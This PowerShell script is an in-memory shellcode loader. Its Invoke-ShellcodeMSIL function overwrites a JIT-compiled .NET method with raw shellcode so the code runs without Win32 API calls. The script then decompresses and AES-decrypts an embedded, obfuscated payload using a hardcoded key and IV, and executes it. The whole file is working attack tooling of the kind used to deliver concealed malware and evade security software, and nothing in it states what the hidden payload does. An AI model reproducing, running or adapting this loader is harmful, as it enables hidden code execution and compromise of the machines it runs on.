function Invoke-ShellcodeMSIL {
<#
SYNOPSIS

    Execute shellcode within the context of the running PowerShell process without making any Win32 function calls.
 
DESCRIPTION

    Invoke-ShellcodeMSIL executes shellcode by using specially crafted MSIL opcodes to overwrite a JITed dummy method. This technique is compelling because unlike Invoke-Shellcode, Invoke-ShellcodeMSIL doesn't call any Win32 functions. 
#>

    [CmdletBinding()] Param (
        [Parameter( Mandatory = $True )]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $Shellcode
    )

    
    function Get-MethodAddress {
        [CmdletBinding()] Param (
            [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
            [System.Reflection.MethodInfo]
            $MethodInfo
        )

        if ($MethodInfo.MethodImplementationFlags -eq 'InternalCall')
        {
            Write-Warning "$($MethodInfo.Name) is an InternalCall method. These methods always point to the same address."
        }

        try { $Type = [MethodLeaker] } catch [Management.Automation.RuntimeException] # Only build the assembly if it hasn't already been defined
        {
            if ([IntPtr]::Size -eq 4) { $ReturnType = [UInt32] } else { $ReturnType = [UInt64] }

            $Domain = [AppDomain]::CurrentDomain
            $DynAssembly = New-Object System.Reflection.AssemblyName('MethodLeakAssembly')
            # Assemble in memory
            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('MethodLeakModule')
            $TypeBuilder = $ModuleBuilder.DefineType('MethodLeaker', [System.Reflection.TypeAttributes]::Public)
            # Declaration of the LeakMethod method
            $MethodBuilder = $TypeBuilder.DefineMethod('LeakMethod', [System.Reflection.MethodAttributes]::Public -bOr [System.Reflection.MethodAttributes]::Static, $ReturnType, $null)
            $Generator = $MethodBuilder.GetILGenerator()

            # Push unmanaged pointer to MethodInfo onto the evaluation stack
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldftn, $MethodInfo)
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)

            # Assemble everything
            $Type = $TypeBuilder.CreateType()
        }

        $Method = $Type.GetMethod('LeakMethod')

        try
        {
            # Call the method and return its JITed address
            $Address = $Method.Invoke($null, @())

            Write-Output (New-Object IntPtr -ArgumentList $Address)
        }
        catch [System.Management.Automation.MethodInvocationException]
        {
            Write-Error "$($MethodInfo.Name) cannot return an unmanaged address."
        }
    }

#region Define the method that will perform the overwrite
    try { $SmasherType =  [MethodSmasher] } catch [Management.Automation.RuntimeException] # Only build the assembly if it hasn't already been defined
    {
        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('MethodSmasher')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $Att = New-Object System.Security.AllowPartiallyTrustedCallersAttribute
        $Constructor = $Att.GetType().GetConstructors()[0]
        $ObjectArray = New-Object System.Object[](0)
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($Constructor, $ObjectArray)
        $AssemblyBuilder.SetCustomAttribute($AttribBuilder)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('MethodSmasher')
        $ModAtt = New-Object System.Security.UnverifiableCodeAttribute
        $Constructor = $ModAtt.GetType().GetConstructors()[0]
        $ObjectArray = New-Object System.Object[](0)
        $ModAttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($Constructor, $ObjectArray)
        $ModuleBuilder.SetCustomAttribute($ModAttribBuilder)
        $TypeBuilder = $ModuleBuilder.DefineType('MethodSmasher', [System.Reflection.TypeAttributes]::Public)
        $Params = New-Object System.Type[](3)
        $Params[0] = [IntPtr]
        $Params[1] = [IntPtr]
        $Params[2] = [Int32]
        $MethodBuilder = $TypeBuilder.DefineMethod('OverwriteMethod', [System.Reflection.MethodAttributes]::Public -bOr [System.Reflection.MethodAttributes]::Static, $null, $Params)
        $Generator = $MethodBuilder.GetILGenerator()
        # The following MSIL opcodes are effectively a memcpy
        # arg0 = destinationAddr, arg1 = sourceAddr, arg2 = length
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_1)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_2)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Volatile)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Cpblk)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)

        $SmasherType = $TypeBuilder.CreateType()
    }

    $OverwriteMethod = $SmasherType.GetMethod('OverwriteMethod')
#endregion

#region Define the method that we're going to overwrite
    try { $Type = [SmashMe] } catch [Management.Automation.RuntimeException] # Only build the assembly if it hasn't already been defined
    {
        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('SmashMe')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $Att = New-Object System.Security.AllowPartiallyTrustedCallersAttribute
        $Constructor = $Att.GetType().GetConstructors()[0]
        $ObjectArray = New-Object System.Object[](0)
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($Constructor, $ObjectArray)
        $AssemblyBuilder.SetCustomAttribute($AttribBuilder)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SmashMe')
        $ModAtt = New-Object System.Security.UnverifiableCodeAttribute
        $Constructor = $ModAtt.GetType().GetConstructors()[0]
        $ObjectArray = New-Object System.Object[](0)
        $ModAttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($Constructor, $ObjectArray)
        $ModuleBuilder.SetCustomAttribute($ModAttribBuilder)
        $TypeBuilder = $ModuleBuilder.DefineType('SmashMe', [System.Reflection.TypeAttributes]::Public)
        $Params = New-Object System.Type[](1)
        $Params[0] = [Int]
        $MethodBuilder = $TypeBuilder.DefineMethod('OverwriteMe', [System.Reflection.MethodAttributes]::Public -bOr [System.Reflection.MethodAttributes]::Static, [Int], $Params)
        $Generator = $MethodBuilder.GetILGenerator()
        $XorValue = 0x41424344
        $Generator.DeclareLocal([Int]) | Out-Null
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0)
        # The following MSIL opcodes serve two purposes:
        # 1) Serves as a dummy XOR function to take up space in memory when it gets jitted
        # 2) A series of XOR instructions won't be optimized out. This way, I'll be guaranteed to sufficient space for my shellcode.
        foreach ($CodeBlock in 1..100)
        {
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldc_I4, $XorValue)
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Xor)
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Stloc_0)
            $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldloc_0)
            $XorValue++
        }
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldc_I4, $XorValue)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Xor)
        $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)
        $Type = $TypeBuilder.CreateType()
    }

    $TargetMethod = $Type.GetMethod('OverwriteMe')
#endregion

    # Force the target method to be JITed so that is can be cleanly overwritten
    Write-Verbose 'Forcing target method to be JITed...'

    foreach ($Exec in 1..20)
    {
        $TargetMethod.Invoke($null, @(0x11112222)) | Out-Null
    }

    if ( [IntPtr]::Size -eq 4 )
    {
        # x86 Shellcode stub
        $FinalShellcode = [Byte[]] @(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)
        <#
        00000000  60                pushad
        00000001  E804000000        call dword 0xa
        00000006  61                popad
        00000007  31C0              xor eax,eax
        00000009  C3                ret
        YOUR SHELLCODE WILL BE PLACED HERE...
        #>

        Write-Verbose 'Preparing x86 shellcode...'
    }
    else
    {
        # x86_64 shellcode stub
        $FinalShellcode = [Byte[]] @(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,
                                     0x55,0xE8,0x0D,0x00,0x00,0x00,0x5D,0x41,
                                     0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x48,
                                     0x31,0xC0,0xC3)
        <#
        00000000  4154              push r12
        00000002  4155              push r13
        00000004  4156              push r14
        00000006  4157              push r15
        00000008  55                push rbp
        00000009  E80D000000        call dword 0x1b
        0000000E  5D                pop rbp
        0000000F  415F              pop r15
        00000011  415E              pop r14
        00000013  415D              pop r13
        00000015  415C              pop r12
        00000017  4831C0            xor rax,rax
        0000001A  C3                ret
        YOUR SHELLCODE WILL BE PLACED HERE...
        #>

        Write-Verbose 'Preparing x86_64 shellcode...'
    }

    # Append user-provided shellcode.
    $FinalShellcode += $Shellcode
    #Write-output ($FinalShellcode | Out-String)
    #exit
    # Allocate pinned memory for our shellcode
    $ShellcodeAddress = [Runtime.InteropServices.Marshal]::AllocHGlobal($FinalShellcode.Length)

    # Copy the original shellcode bytes into the pinned, unmanaged memory.
    # Note: this region of memory if marked PAGE_READWRITE
    [Runtime.InteropServices.Marshal]::Copy($FinalShellcode, 0, $ShellcodeAddress, $FinalShellcode.Length)
    $TargetMethodAddress = [IntPtr] (Get-MethodAddress $TargetMethod)
    Write-Verbose 'Overwriting dummy method with the shellcode...'

    $Arguments = New-Object Object[](3)
    $Arguments[0] = $TargetMethodAddress
    $Arguments[1] = $ShellcodeAddress
    $Arguments[2] = $FinalShellcode.Length

    # Overwrite the dummy method with the shellcode opcodes
    $OverwriteMethod.Invoke($null, $Arguments)

    Write-Verbose 'Executing shellcode...'

    # 'Invoke' our shellcode >D
    $ShellcodeReturnValue = $TargetMethod.Invoke($null, @(0x11112222))

    if ($ShellcodeReturnValue -eq 0)
    {
        Write-Verbose 'Shellcode executed successfully!'
    }
}



[Byte[]] $enc = 0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x01, 0x80, 0x02, 0x7f, 0xfd, 0x06, 0xfc, 0x12, 0xda, 0x1d, 0xb7, 0x7d, 0x24, 0x49, 0xdf, 0x7e, 0x0f, 0x5d, 0x93, 0x88, 0x3a, 0xf4, 0x80, 0xea, 0xef, 0x54, 0xd2, 0x50, 0x25, 0x06, 0x34, 0x8d, 0x11, 0xc6, 0x8d, 0x53, 0x07, 0xb1, 0xdc, 0x78, 0x42, 0xd6, 0x75, 0x84, 0x80, 0xc3, 0x97, 0x2b, 0x3e, 0x22, 0x37, 0x64, 0xc4, 0x78, 0x29, 0xbf, 0xa2, 0xc3, 0xa8, 0x53, 0x44, 0x27, 0x20, 0x67, 0x60, 0x0c, 0xa5, 0x2c, 0xd7, 0x4d, 0x8e, 0xc1, 0xcc, 0x80, 0x75, 0xee, 0xe2, 0xda, 0xa2, 0xc8, 0xaa, 0x45, 0x3f, 0x27, 0x8d, 0x8f, 0xaf, 0xb9, 0xbe, 0xd9, 0x60, 0x73, 0x84, 0x7b, 0xc4, 0x1f, 0x1f, 0x31, 0xf7, 0xf1, 0xff, 0x84, 0xc1, 0xf1, 0x9e, 0x8a, 0xf7, 0x98, 0xac, 0x36, 0x42, 0x33, 0x88, 0xa6, 0x72, 0x15, 0x16, 0xe6, 0x6d, 0xb1, 0x52, 0x8a, 0x18, 0x80, 0x9f, 0x51, 0xea, 0xa0, 0x26, 0x13, 0x36, 0x45, 0xfb, 0xbc, 0x5c, 0x43, 0x6f, 0x5f, 0x29, 0xdd, 0xcb, 0x7b, 0xb2, 0xb5, 0x93, 0x6d, 0x9d, 0x32, 0xcd, 0x50, 0x21, 0x5e, 0x82, 0xa8, 0xd0, 0xaf, 0x5e, 0x56, 0x2e, 0x33, 0xc0, 0x97, 0xad, 0xba, 0x57, 0x55, 0xf4, 0xe3, 0x90, 0x8b, 0xa3, 0x04, 0x1a, 0xbb, 0xf6, 0xce, 0xe7, 0xd2, 0x4f, 0xc9, 0xb3, 0xf9, 0xd9, 0x4b, 0x93, 0xa9, 0xeb, 0x58, 0x01, 0x2b, 0x24, 0x1f, 0xf2, 0x0e, 0x42, 0x05, 0x59, 0x20, 0x65, 0xbd, 0xe5, 0xdd, 0x91, 0x99, 0x3b, 0x5b, 0x99, 0x16, 0x97, 0x72, 0x56, 0x51, 0xf4, 0xbb, 0xd9, 0x12, 0x75, 0x1c, 0xd1, 0x99, 0xe2, 0xa8, 0xb9, 0x9d, 0x47, 0x33, 0x58, 0xed, 0xfd, 0xb5, 0x9d, 0x2d, 0x39, 0x57, 0x58, 0x04, 0x4f, 0xbb, 0x1d, 0x6d, 0x5b, 0x3a, 0x7e, 0x7d, 0x87, 0x86, 0x03, 0x87, 0x4d, 0xa2, 0x8d, 0xf4, 0x1a, 0xef, 0x85, 0xf8, 0xa2, 0x3e, 0x45, 0x0f, 0xc6, 0x9d, 0x09, 0x87, 0x2f, 0x58, 0x06, 0xc9, 0xe0, 0xd3, 0xc7, 0x74, 0xbe, 0xab, 0x74, 0x32, 0x1d, 0x20, 0xdd, 0x68, 0xfb, 0x6c, 0x56, 0x4a, 0x82, 0xab, 0xc0, 0x08, 0xb9, 0x06, 0xdb, 0x8f, 0xd7, 0x3b, 0xa6, 0x26, 0x32, 0xea, 0x1c, 0x30, 0xaf, 0xcc, 0x22, 0xcf, 0x97, 0x74, 0x6c, 0xa2, 0xbc, 0x4e, 0x9c, 0x93, 0xd8, 0x1d, 0x6f, 0x50, 0x0b, 0x5a, 0x05, 0x03, 0xdb, 0x77, 0xb0, 0x53, 0xa4, 0x3c, 0xbb, 0x6b, 0x7e, 0x48, 0x44, 0xcc, 0x09, 0xa7, 0x42, 0xca, 0xb0, 0x05, 0x38, 0xda, 0x92, 0xd3, 0x0c, 0x39, 0xb2, 0x0f, 0xc6, 0xc1, 0x9b, 0xbc, 0xdc, 0x47, 0xc1, 0x00, 0x2f, 0x08, 0x73, 0xd6, 0x18, 0x0a, 0x18, 0xf9, 0xc3, 0xd7, 0x9e, 0xed, 0x61, 0x49, 0x27, 0xd1, 0xb5, 0x66, 0x37, 0x2e, 0x62, 0xe2, 0x92, 0xe4, 0xe3, 0x89, 0x79, 0x7c, 0x84, 0x28, 0xc9, 0x43, 0x52, 0xa7, 0xd9, 0xcb, 0x29, 0x57, 0x4b, 0x0e, 0x11, 0x7b, 0x3d, 0x78, 0x49, 0x2a, 0x0c, 0x8e, 0xa2, 0x75, 0x1a, 0x4d, 0x93, 0xda, 0x9c, 0xa8, 0x0a, 0x10, 0x93, 0xd3, 0x9d, 0x3a, 0xd7, 0x2c, 0x34, 0x8f, 0xd0, 0x53, 0x80, 0xeb, 0x13, 0x98, 0xc0, 0xdc, 0x5d, 0x32, 0x18, 0xc0, 0x43, 0xe6, 0x9b, 0xdd, 0x53, 0x0e, 0x6b, 0xe4, 0x81, 0x7a, 0xc3, 0x17, 0xfd, 0x88, 0x8d, 0x16, 0x5a, 0x1b, 0xb2, 0x2b, 0x31, 0xff, 0x5e, 0xaf, 0x7b, 0x85, 0x54, 0xc9, 0x14, 0x21, 0xea, 0x76, 0xc1, 0x05, 0x7f, 0x98, 0xb3, 0x9b, 0x72, 0x51, 0xa9, 0x92, 0x11, 0x9a, 0xee, 0xad, 0xaf, 0xc8, 0x21, 0xd5, 0x6c, 0xaa, 0x52, 0xd5, 0xfb, 0x91, 0x54, 0xcb, 0x0f, 0x23, 0x70, 0x23, 0x95, 0xae, 0x6d, 0x74, 0xb4, 0x4c, 0x3c, 0x1f, 0x7b, 0xe5, 0x9f, 0xde, 0x2e, 0xae, 0x3c, 0x0b, 0x23, 0x6c, 0xf8, 0x13, 0x74, 0x5f, 0x25, 0x0c, 0x06, 0xd1, 0x7c, 0xa9, 0xd8, 0x24, 0x68, 0xc0, 0xdb, 0xd8, 0x64, 0xda, 0x47, 0x0f, 0xfe, 0xa0, 0xc2, 0x57, 0xc3, 0xa1, 0x76, 0x1e, 0xa6, 0x15, 0x5e, 0x56, 0xe1, 0x17, 0xf5, 0xc4, 0xf2, 0x25, 0x83, 0xda, 0x31, 0xbd, 0xb2, 0x7d, 0x01, 0x03, 0xa2, 0x7a, 0xd7, 0x0f, 0x10, 0xc3, 0xa5, 0x76, 0x63, 0x9e, 0xe8, 0x63, 0xb0, 0xb0, 0x5c, 0x9e, 0x97, 0x2b, 0xaf, 0xea, 0x61, 0xaa, 0xbc, 0x57, 0xec, 0x67, 0x35, 0xfa, 0x2c, 0x14, 0x0a, 0x81, 0x63, 0xd2, 0x61, 0x95, 0xc0, 0x8c, 0x32, 0xa2, 0x2f, 0x6e, 0xca, 0xc8, 0xc2, 0xb9, 0xf6, 0x33, 0x72, 0x8a, 0x7b, 0x9d, 0x1f, 0x81, 0x9b, 0x3f, 0x14, 0x93, 0x12, 0x8b, 0x8f, 0x10, 0xca, 0x42, 0xd7, 0x3f, 0x4c, 0x69, 0x6e, 0x12, 0xeb, 0xc4, 0x07, 0xe9, 0x1d, 0xa9, 0x8e, 0xb2, 0xf4, 0x8d, 0x51, 0x6b, 0x20, 0x74, 0x26, 0x8e, 0xb8, 0x50, 0x45, 0xcb, 0x88, 0x80, 0x02, 0x00, 0x00



$input = New-Object System.IO.MemoryStream(, $enc)
$dec = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
$gzipStream.CopyTo($dec)
$gzipStream.Close()
$input.Close()
[byte[]] $dec = $dec.ToArray()
#$dec = Get-DecompressedByteArray $shellCode


$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
$aesManaged.Mode =  [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aesManaged.BlockSize = 128
$aesManaged.KeySize = 128
$aesManaged.Key = 0xbf, 0x34, 0x02, 0x9b, 0x28, 0x92, 0xbe, 0xbb, 0xb8, 0x53, 0x27, 0x98, 0x20, 0x53, 0xc8, 0xe1, 0x22, 0xce, 0x37, 0xa4, 0xc0, 0x1a, 0x14, 0xea, 0x0b, 0x82, 0x3b, 0x68, 0x84, 0x82, 0x2d, 0x1d
$aesManaged.IV = 0x48, 0x5d, 0xb7, 0x2f, 0x8a, 0xc0, 0x88, 0xdc, 0xbf, 0x7f, 0xb8, 0x7f, 0x27, 0x95, 0x2d, 0xda
$dec = $aesManaged.CreateDecryptor().TransformFinalBlock($dec, 0, $dec.Length)

#($dec| % { "0x" + $_.ToString("x2") } ) -join ', '

Invoke-ShellcodeMSIL -Shellcode $dec